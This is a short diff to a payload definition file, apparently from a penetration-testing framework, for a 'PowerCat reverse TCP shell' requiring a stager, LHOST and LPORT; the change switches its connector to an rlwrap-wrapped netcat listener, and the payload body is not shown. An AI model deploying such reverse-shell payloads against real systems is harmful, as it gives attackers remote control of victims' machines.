@@ -1,7 +1,7 @@
 title=PowerCat reverse TCP shell
 info=This payload to work requires a stager (web_echo2powershell) and PARAM1 to be 'p' for PS or ' cmd' for cmd.exe.
 required_opts=LPORT;LHOST;PARAM1;STAGER
-connector=reverse_tcp_netcat
+connector=reverse_tcp_rlwrap_netcat
 payload=multiline
 function powercat
 {
